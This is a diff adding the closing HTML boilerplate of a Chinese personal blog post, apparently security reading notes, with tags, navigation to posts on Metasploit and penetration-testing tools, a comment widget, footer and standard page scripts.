+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="tag">读书笔记</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/05/17/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Metasploit渗透测试指南
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E4%B8%89%E7%AB%A0%EF%BC%88%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">0x02 常用渗透工具</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "ypvGgRhcfezE3aedvYAO6oYo-gzGzoHsz",
+    app_key: "K7VGmo5vDtIxdtx0uAelYpSN",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "秀儿请上座~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023
+        <i class="ri-heart-fill heart_icon"></i> Limbus
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/logo.png" alt="Limbus&#39; Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/photography">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2023/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯茶吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/wechat.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
